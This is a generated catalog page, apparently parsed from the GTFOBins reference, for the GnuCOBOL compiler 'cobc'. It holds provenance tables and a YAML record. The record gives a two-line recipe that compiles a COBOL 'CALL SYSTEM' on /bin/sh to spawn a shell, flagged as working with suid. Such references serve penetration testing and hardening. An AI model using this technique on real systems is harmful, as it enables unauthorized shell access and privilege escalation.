---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# cobc

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `cobc` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/cobc` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [cobc](../../tools/linux/cobc.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | cobc |
| name | cobc |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/cobc/ |

## Preserved Source Material

```yaml
_body: ''
_name: cobc
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/cobc
functions:
  shell:
  - code: 'echo ''CALL "SYSTEM" USING "/bin/sh".'' >/path/to/temp-file

      cobc -xFj --frelax-syntax-checks /path/to/temp-file'
    comment: The `/path/to/temp-file` sill be overwritten after the execution.
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
